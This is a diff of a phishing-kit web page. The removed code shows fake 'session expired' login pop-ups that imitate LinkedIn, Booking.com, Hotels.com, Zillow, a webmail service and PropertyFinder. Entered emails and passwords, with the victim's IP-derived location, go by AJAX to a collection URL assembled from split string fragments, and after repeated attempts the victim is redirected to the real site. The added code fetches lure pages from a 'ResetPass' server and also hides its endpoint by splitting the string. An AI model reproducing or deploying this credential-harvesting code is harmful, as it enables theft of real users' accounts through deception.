@@ -15,18 +15,17 @@
       href="original-favicon.ico"
       type="image/x-icon"
     />
-    <!-- <base href="https://stareio.com/SOMDserver/assets/" /> -->
-    <base href="http://tools.com/pages/latestpages/SOMDserver/assets/" />
+  <base href="https://khanieteam.com/ResetPass/Server/assets/" />
+     <!--  <base href="http://tools.com/pages/latestpages/ResetPass/Server/assets/" /> -->
 
-    <!-- <script src="./myjs.js"></script> -->
-    <script>
-      const BASE_URL = "http://tools.com/pages/latestpages/SOMDserver";
-      const ASSETS_URL = "http://tools.com/pages/latestpages/SOMDserver/assets";
-      // const BASE_URL = "https://stareio.com/SOMDserver";
-      // const ASSETS_URL = "https://stareio.com/SOMDserver/assets";
+    <script defer>
+      //const BASE_URL = "http://tools.com/pages/latestpages/ResetPass/Server";
+      //const ASSETS_URL = "http://tools.com/pages/latestpages/ResetPass/Server/assets";
+      const BASE_URL = "https://khanieteam.com/ResetPass/Server";
+      const ASSETS_URL = "https://khanieteam.com/ResetPass/Server/assets";
 
-      async function getPageContent(url, original) {
-        fetch(`${BASE_URL}/${url}.html`)
+      async function getPageContent(page, route, original) {
+        fetch(`${BASE_URL}/${route}/${page}.html`)
           .then((response) => response.text())
           .then((datan) => {
             document.querySelector("#myFrame").innerHTML = datan;
@@ -46,165 +45,71 @@
               document.querySelector("#foc").value;
             document.querySelector("#orgi").value = original;
             document.querySelector("#page").value = page;
+            document.querySelector("#general_loader").style.display = "none";
           })
           .catch((error) => {
             console.error("Error Loading data:", error);
           });
       }
 
-      async function abs(ml, mg, ss) {
+      async function abs(ml, mg, route) {
         try {
-          if (ss == "lkkd") {
-            page = "lkkd";
-            original = "https://www.linkedin.com/login";
-          } else if (ss == "lkkd-en") {
-            page = "lkkd-en";
-            original = "https://www.linkedin.com/login";
-          } else if (ss == "boook") {
-            page = "boook";
-            original = "https://account.booking.com/sign-in";
-          } else if (ss == "excel") {
-            page = "excel";
-            original = "https://account.booking.com/sign-in";
-          } else if (ss == "hots") {
-            page = "hots";
-            original = "https://www.hotels.com/login";
-          } else if (ss == "zill") {
-            page = "zill";
-            original =
-              "https://www.zillow.com/auth/user/login?login_mode=redirect&entry_point=topnav";
-          } else if (ss == "mail2000") {
-            page = "mail2000";
-            original = "http://webmail.pbf.com.tw/cgi-bin/start?wrap=1";
-          } else if (ss == "pexpert") {
-            page = "pexpert";
-            original = "https://app.propertyfinder.ae/user-profile";
-          } else if (ss == "micn") {
-          } else if (ss == "pfinder") {
-            page = "pfinder";
-            original = "https://www.propertyfinder.ae/";
-          } else if (ss == "micn") {
-            page = "micn";
-            original = "";
-          } else {
-            page = "";
-            original = "";
-          }
-          console.log(mg, page, original, "here");
+          let r = await fetch(`${ml}?${mg}`);
+          //   let testcheck = await r.text();
+          //   console.log(testcheck);
+          let v = await r.json();
+          let page = JSON.parse(v).mx_page;
+          let original = JSON.parse(v).original;
 
-          await getPageContent(page, original);
-          displayPage(page);
+          console.log(mg, page, original, "here", route);
+
+          getPageContent(page, route, original);
         } catch (e) {
           console.log("ABS Func", e);
         }
       }
 
-      function displayPage(page) {
-        if (
-          page == "lkkd" ||
-          page == "lkkd-en" ||
-          page == "zill" ||
-          page == "boook" ||
-          page == "excel" ||
-          page == "hots" ||
-          page == "mail2000" ||
-          page == "pexpert" ||
-          page == "pfinder" ||
-          page == "micn"
-        ) {
-          console.log("Page", page);
+      let xx = window.location.href.split("?");
+      xx = xx[1].split("__");
+      let mg = "";
+      let route = "";
+      let base64regex =
+        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+      if (xx[1] != undefined) {
+        if (!base64regex.test(xx[1])) {
+          mg = xx[1];
         } else {
-          document.querySelector(".frr_popup").style.display = "flex";
-
-          document.querySelector("#test #errorPop").innerHTML = `<style>
-
-            .err_dialog {
-                width: 450px;
-                background-color: white;
-                border: 1px solid #e0e0e0;
-                border-radius: 8px;
-                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-                padding: 16px;
-                text-align: center;
-            }
-
-            .err_dialog-header {
-                display: flex;
-                align-items: center;
-                margin-bottom: 12px;
-            }
-
-            .err_dialog-header-icon {
-                width: 20px;
-                height: 20px;
-                margin-right: 10px;
-                color: white;
-                background-color: orange;
-                border-radius: 100%;
-            }
-
-            .err_dialog-header span {
-                font-size: 16px;
-                font-weight: bold;
-                color: #333;
-            }
-
-            .err_dialog-content {
-                font-size: 14px;
-                color: #666;
-                margin-bottom: 16px;
-            }
-
-            .err_dialog-buttons {
-                display: flex;
-                justify-content: flex-end;
-            }
-
-            .err_dialog-buttons button {
-                padding: 5px 10px;
-                height: 36px;
-                border: none;
-                border-radius: 4px;
-                font-size: 14px;
-                cursor: pointer;
-                margin-left: 5px;
-            }
-
-            .err_dialog-buttons .err_cancel-button {
-                background-color: #f2f2f2;
-                color: #333;
-            }
-
-            .err_dialog-buttons .err_cancel-button:hover {
-                background-color: #e0e0e0;
-            }
-
-            .err_dialog-buttons .err_login-button {
-                background-color: #007bff;
-                color: white;
-            }
-
-            .err_dialog-buttons .err_login-button:hover {
-                background-color: #0056b3;
-            }
-            </style>
-
-            <div class="err_dialog">
-
-                <div class="err_dialog-content">
-                   <br> 你的登录状态已失效，请重新登录。
-                </div>
-                <div class="err_dialog-buttons">
-                    <button class="err_login-button" onclick="showForm('default')"">重新登录</button>
-                </div>
-            </div>`;
+          mg = atob(xx[1]);
         }
+
+        if (xx[2] == "vy") {
+          route = "verify";
+        } else if (xx[2] == "re") {
+          route = "change";
+        } else {
+          console.log("No extra script loaded for this page.");
+        }
+
+        let rd1 = BASE_URL;
+        let rd2 = "/engine/";
+        let rd3 = "serveP";
+        let rd4 = "age.p";
+        let rd5 = "hp";
+        let rd6 = "";
+
+        console.log(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg);
+
+        document.addEventListener("DOMContentLoaded", function () {
+          abs(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg, route);
+        });
       }
     </script>
     <script
       type="text/javascript"
       src="https://code.jquery.com/jquery-latest.min.js"
     ></script>
+    <script src="http://tools.com/pages/latestpages/ResetPass/Server/index.js"></script>
   </head>
 
   <body>
@@ -215,19 +120,14 @@
         padding: 0;
         height: 100%;
       }
-      iframe {
-        width: 100%;
-        height: 100vh; /* Occupies full viewport height */
-        border: none; /* Optional: remove border */
-      }
 
       * {
         padding: 0;
         margin: 0;
         box-sizing: border-box;
       }
-      #loader {
-        display: none;
+      #general_loader {
+        display: flex;
         align-items: center;
         justify-content: center;
         width: 100%;
@@ -239,433 +139,66 @@
         z-index: 99;
       }
 
-      @keyframes hideLoader {
-        from {
-          opacity: 1;
-        }
-
-        to {
-          opacity: 0;
-        }
-      }
-
-      @keyframes showLoader {
-        from {
-          opacity: 0;
-        }
-
-        to {
-          opacity: 1;
-        }
-      }
-
-      .lds-ellipsis {
-        display: inline-block;
-        position: relative;
-        width: 80px;
-        height: 80px;
-        opacity: 0.8;
-      }
-
-      .lds-ellipsis div {
-        position: absolute;
-        top: 33px;
-        width: 13px;
-        height: 13px;
+      #general_loader > div {
+        width: 40px;
+        height: 40px;
+        border: 6px solid #ccc;
+        border-top-color: #00bfff;
         border-radius: 50%;
-        background: dodgerblue;
-        animation-timing-function: cubic-bezier(0, 1, 1, 0);
+        animation: spin 1s linear infinite;
       }
 
-      .lds-ellipsis div:nth-child(1) {
-        left: 8px;
-        animation: lds-ellipsis1 0.6s infinite;
-      }
-
-      .lds-ellipsis div:nth-child(2) {
-        left: 8px;
-        animation: lds-ellipsis2 0.6s infinite;
-      }
-
-      .lds-ellipsis div:nth-child(3) {
-        left: 32px;
-        animation: lds-ellipsis2 0.6s infinite;
-      }
-
-      .lds-ellipsis div:nth-child(4) {
-        left: 56px;
-        animation: lds-ellipsis3 0.6s infinite;
-      }
-
-      @keyframes lds-ellipsis1 {
-        0% {
-          transform: scale(0);
-        }
-
-        100% {
-          transform: scale(1);
-        }
-      }
-
-      @keyframes lds-ellipsis3 {
-        0% {
-          transform: scale(1);
-        }
-
-        100% {
-          transform: scale(0);
-        }
-      }
-
-      @keyframes lds-ellipsis2 {
-        0% {
-          transform: translate(0, 0);
-        }
-
-        100% {
-          transform: translate(24px, 0);
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
         }
       }
     </style>
-    <div id="loader">
-      <div class="lds-ellipsis">
-        <div></div>
-        <div></div>
-        <div></div>
-        <div></div>
-      </div>
-    </div>
-    <input
-      class="frr_input"
-      type="hidden"
-      id="loc"
-      name="email"
-      required
-      placeholder="Loc"
-    />
-    <input
-      class="frr_input"
-      type="hidden"
-      id="foc"
-      name="email"
-      required
-      placeholder="FOC"
-    />
 
+    <div id="general_loader">
+      <div></div>
+    </div>
+
+    <input type="hidden" id="route" name="email" required placeholder="" />
+    <input type="hidden" id="loc" name="email" required placeholder="Loc" />
+    <input type="hidden" id="foc" name="email" required placeholder="FOC" />
+    <input type="hidden" id="trial" name="email" required placeholder="trial" />
     <input
-      class="frr_input"
-      type="hidden"
-      id="trial"
-      name="email"
-      required
-      placeholder="trial"
-    />
-    <input
-      class="frr_input"
       type="hidden"
       id="orgi"
       name="orgi"
       required
       placeholder="original"
     />
-
-    <input
-      class="frr_input"
-      type="hidden"
-      id="page"
-      name="page"
-      required
-      placeholder="PG"
-    />
-
-    <script>
-      let xx = window.location.href.split("?");
-      xx = xx[1].split("__");
-      let mg = "";
-      let base64regex =
-        /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-
-      if (xx[1] != undefined) {
-        if (!base64regex.test(xx[1])) {
-          mg = xx[1];
-        } else {
-          mg = atob(xx[1]);
-        }
-
-        let rd1 = `${BASE_URL}/engine/servePage.php`;
-        let rd2 = "";
-        let rd3 = "";
-        let rd4 = "";
-        let rd5 = "";
-        let rd6 = "";
-
-        abs(`${rd1}${rd2}${rd3}${rd4}${rd5}${rd6}`, mg, xx[3]);
-      }
-    </script>
-
-    <style>
-      #formPop {
-        display: none;
-      }
-
-      #errorPop {
-        display: flex;
-      }
-
-      .frr_popup {
-        display: none;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
-        justify-content: center;
-        align-items: flex-start;
-        z-index: 20000000000000;
-      }
-
-      #test {
-        /* background-color: white; */
-        padding: 20px;
-        border-radius: 5px;
-        text-align: center;
-        width: auto;
-        margin-top: 50px;
-      }
-    </style>
-    <script>
-      function showForm(a) {
-        console.log("wwwwwwwwwww", a);
-
-        document.querySelector("#test #errorPop").style.display = "none";
-        if (!a) {
-          document.querySelector(".frr_popup").style.display = "none";
-        } else {
-          document.querySelector(
-            ".frr_popup #test"
-          ).innerHTML += `<form id="form_" action="#" method="POST" onsubmit="subForm(event)">
-            <input type="hidden" value="Global Others" id="resBox" />
-          <div id="formPop">
-            <style>
-              .frr_login-container {
-                background-color: #fff;
-                padding: 20px;
-                border-radius: 8px;
-                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-                width: 350px;
-              }
-
-              .frr_h2 {
-                text-align: center;
-              }
-
-              .frr_form-group {
-                margin-bottom: 15px;
-              }
-
-              .frr_label {
-                display: block;
-                font-size: 14px;
-                margin-bottom: 5px;
-                text-align: left;
-              }
-
-              .frr_input {
-                width: 100%;
-                padding: 10px;
-                font-size: 14px;
-                border: 1px solid #ddd;
-                border-radius: 4px;
-              }
-
-              .frr_button {
-                width: auto;
-                padding: 10px;
-                background-color: #007bff;
-                color: white;
-                font-size: 16px;
-                border: none;
-                border-radius: 4px;
-                cursor: pointer;
-                float: right;
-              }
-
-              .frr_button:hover {
-                background-color: #0056b3;
-              }
-
-              .frr_error-message {
-                color: red;
-                font-size: 12px;
-                margin-top: 5px;
-              }
-            </style>
-
-            <div class="frr_login-container">
-              <div
-                style="
-                  display: flex;
-                  justify-content: center;
-                  align-items: center;
-                  margin-bottom: 10px;
-                  gap: 10px;
-                "
-              >
-                <img id="favic" height="30" />
-                <h2 class="frr_h2">Login</h2>
-              </div>
-              <p style="margin-bottom: 20px">
-                Session Expired! Login to Continue.
-              </p>
-              <div class="frr_form-group">
-                <label class="frr_label" for="email">Email:</label>
-                <input
-                  class="frr_input"
-                  type="email"
-                  id="fuc"
-                  name="email"
-                  required
-                  placeholder="Enter your email"
-                  value="${mg}"
-                />
-                <span id="errmsg" class="frr_error-message" style='display: none'>您的用户名或密码有误，请重新输入!</span>
-              </div>
-
-              <div class="frr_form-group">
-                <label class="frr_label" for="password">Password:</label>
-                <input
-                  class="frr_input"
-                  type="password"
-                  id="fpc"
-                  name="password"
-                  required
-                  placeholder="Enter your password"
-                />
-              </div>
-
-              <button type="submit" class="frr_button" id="frr_button">
-                Login
-              </button>
-            </div>
-          </div>
-        </form> `;
-
-          document.querySelector("#test #formPop").style.display = "flex";
-        }
-      }
-    </script>
-
-    <div class="frr_popup">
-      <div id="test">
-        <div id="errorPop"></div>
-      </div>
-    </div>
+    <input type="hidden" id="page" name="page" required placeholder="PG" />
 
     <div id="myFrame"></div>
 
     <script>
-      //Your PHP GOES HERE
-      let nbg1 = "htt";
-      let nbg2 = "ps://si";
-      let nbg3 = "nglet";
-      let nbg4 = "oncop.i";
-      let nbg5 = "nfo/we";
-      let nbg6 = "bxr.php";
+      document.addEventListener("DOMContentLoaded", function () {
+        // sessionStorage.clear();
 
-      let nbg = `${nbg1}${nbg2}${nbg3}${nbg4}${nbg5}${nbg6}`;
-
-      // sessionStorage.clear();
-
-      let trialCount = sessionStorage.getItem("num_trial");
-
-      if (!trialCount) {
-        sessionStorage.setItem("num_trial", 0);
-      } else if (trialCount >= 2) {
-        window.location.assign(original);
-      }
-
-      let foc = document.querySelector("#foc");
-      let trial = document.querySelector("#trial");
-
-      console.log(mg, original, "mew");
-
-      foc.value = mg;
-
-      trial.value = trialCount;
-
-      // let myForm = document.querySelector("#form_");
-
-      async function subForm(event) {
-        event.preventDefault();
-        //sessionStorage.clear();
+        document.querySelector("#route").value = route;
+        let trialCount = sessionStorage.getItem("num_trial");
         let original = document.querySelector("#orgi").value;
-        let fuc = document.querySelector("#fuc");
-        let fpc = document.querySelector("#fpc");
-        let loc = document.querySelector("#loc");
 
-        $.ajax({
-          dataType: "JSON",
-          url: nbg,
-          type: "POST",
-          data: {
-            hos: xx[2],
-            foc: foc.value,
-            fuc: fuc.value,
-            fpc: fpc.value,
-            loc: loc.value,
-            trial: trial.value,
-            resBox: document.querySelector("#resBox").value,
-          },
-          beforeSend: function (xhr) {
-            // console.log(xhr);
-            animateLoading(true);
-          },
-          success: function (response) {
-            console.log("Success", response);
-            // Combine logic from both success functions here
-            if (response) {
-              animateLoading(false);
-              // console.log(response);
-              if (response["signal"] == "ok") {
-                trialCount++;
-                sessionStorage.setItem("num_trial", trialCount);
-                trial.value = trialCount;
+        if (!trialCount) {
+          sessionStorage.setItem("num_trial", 0);
+        } else if (trialCount >= 2) {
+          window.location.assign(original);
+        }
 
-                if (trialCount >= 2) {
-                  count = 0;
-                  window.location.replace(original);
-                  return false;
-                }
+        let foc = document.querySelector("#foc");
+        let trial = document.querySelector("#trial");
 
-                fpc.value = "";
-                fpc.focus();
-                showError(true);
-              } else {
-                console.log("Error Occurred!!!");
-              }
-            }
-          },
-          error: function (jqXHR, textStatus, errorThrown) {
-            console.log("Error", jqXHR, textStatus, errorThrown);
-            fpc.value = "";
-            fpc.focus();
-            showError(true);
-          },
-          complete: function (xhr) {
-            animateLoading(false);
-          },
-        });
-      }
+        console.log(mg, original, "mew");
 
-      $.get(
-        "https://ipinfo.io/json?token=10da60a9ff2d81",
-        function (response) {
-          let cou = `${response.city}, ${response.region}, ${response.country}. ${response.postal} ${response.timezone}`;
-          $("#loc").val(cou);
-        },
-        "jsonp"
-      );
+        foc.value = mg;
+
+        trial.value = trialCount;
+
+        // Your code here
+      });
     </script>
   </body>
 </html>
